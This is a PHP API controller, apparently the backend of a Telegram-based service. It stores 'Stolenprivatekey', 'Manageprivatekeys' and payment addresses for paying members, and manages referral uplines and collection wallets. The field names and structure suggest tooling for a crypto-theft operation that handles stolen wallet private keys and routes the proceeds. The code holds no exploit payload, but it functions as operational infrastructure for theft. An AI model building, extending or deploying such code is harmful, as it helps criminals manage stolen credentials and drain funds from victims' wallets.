<?php
// 所有自定义控制器的基本控制器,应该继承自它
namespace app\hc\v1\controller;


use Db\Db;
use function common\dump;
use function common\tgverification;
use function common\retur;


use common\Controller;

class  UpdateController extends Controller
{




    public function user()
    {
        try {
            $data = json_decode(file_get_contents('php://input'), true);
            $hash = tgverification($data['hash']);

            if (!$hash) {
                echo json_encode(retur('失败', '非法访问', 409));
                exit;
            }

            $Permissions =  Db::table('userinfo')->field('*')->where(['tgid' => $hash['id'], 'transfer' => 1])->find();
            if (!$Permissions) {
                echo json_encode(retur('失败', '没有权限,请开通后使用', 403));
                exit;
            }

            //
            $arr =  Db::table('user')->field('*')->where(['tgid' => $hash['id']])->find();
            if ($arr) {
                $arr =  Db::table('user')->where(['tgid' => $hash['id']])->update(['grade' => 1, 'Stolenprivatekey' => $data['Stolenprivatekey'], 'Manageprivatekeys' => $data['Manageprivatekeys'], 'Paymentaddress' => $data['Paymentaddress']]);
                if ($arr > 0) {
                    echo json_encode(retur('成功', $arr));
                } else {
                    echo json_encode(retur('失败', '没更改任何数据', 409));
                }
                //修改
            } else {
                //添加
                $arr =  Db::table('user')->insert(['grade' => 1, 'tgid' => $hash['id'], 'Stolenprivatekey' => $data['Stolenprivatekey'], 'Manageprivatekeys' => $data['Manageprivatekeys'], 'Paymentaddress' => $data['Paymentaddress']]);
                if ($arr > 0) {
                    echo json_encode(retur('成功', $arr));
                } else {
                    echo json_encode(retur('失败', '添加失败请查看参数', 422));
                }
            }
        } catch (\Throwable $th) {
            echo json_encode(retur('失败', '非法访问', 500));
        }
    }

    public function switch()
    {
        $data = json_decode(file_get_contents('php://input'), true);
        $hash = tgverification($data['hash']);

        if (!$hash) {
            echo json_encode(retur('失败', '非法访问', 409));
            exit;
        }

        $Permissions =  Db::table('userinfo')->field('*')->where(['tgid' => $hash['id'], 'transfer' => 1])->find();
        if (!$Permissions) {
            echo json_encode(retur('失败', '没有权限,请开通后使用', 403));
            exit;
        }

        $arr =  Db::table('user')->field('*')->where(['tgid' => $hash['id']])->find();
        if ($arr) {
            $arr =  Db::table('user')->where(['tgid' => $hash['id']])->update(['switch' => $data['switch']]);
            if ($arr > 0) {
                echo json_encode(retur('成功', $arr));
            } else {
                echo json_encode(retur('失败', '没更改任何数据', 409));
            }
        } else {
            echo json_encode(retur('失败', '非法访问', 500));
        }
    }

    public function Superior()
    {
        $data = json_decode(file_get_contents('php://input'), true);
        $hash = tgverification($data['hash']);

        if (!$hash) {
            echo json_encode(retur('失败', '非法访问', 409));
            exit;
        }

        $Permissions =  Db::table('userinfo')->field('*')->where(['tgid' => $hash['id']])->find();

        if ($Permissions['Superior']) {
            echo json_encode(retur('失败', '上级ID已存在', 409));
            exit;
        }

        $Superior =  Db::table('userinfo')->field('*')->where(['tgid' => $data['Superior']])->find();
        if (!$Superior) {
            echo json_encode(retur('失败', 'ID不存在,请检查ID', 409));
            exit;
        }

        if ($data['Superior'] == $hash['id']) {
            echo json_encode(retur('失败', '上级ID不能是自己', 409));
            exit;
        }



        $arr =  Db::table('userinfo')->where(['tgid' => $hash['id']])->update(['Superior' => $data['Superior']]);
        if ($arr > 0) {
            echo json_encode(retur('成功', '绑定成功'));
        } else {
            echo json_encode(retur('失败', '绑定失败', 409));
        }
    }

    public function Collection()
    {
        $data = json_decode(file_get_contents('php://input'), true);
        $hash = tgverification($data['hash']);

        if (!$hash) {
            echo json_encode(retur('失败', '非法访问', 409));
            exit;
        }

        $Permissions =  Db::table('userinfo')->field('*')->where(['tgid' => $hash['id']])->find();

        if ($Permissions['Collection']) {
            echo json_encode(retur('失败', '收款钱包已经存在', 409));
            exit;
        }
        $arr =  Db::table('userinfo')->where(['tgid' => $hash['id']])->update(['Collection' => $data['Collection']]);
        if ($arr > 0) {
            echo json_encode(retur('成功', '添加成功'));
        } else {
            echo json_encode(retur('失败', '添加失败', 409));
        }
    }
}

//用户充值 实现逻辑

//为每位用户生成一个地址

//用户每次登陆  都去检测一次余额  /
// 如果余额 大于旧余额  那么就是充值了    给用户增加余额 即可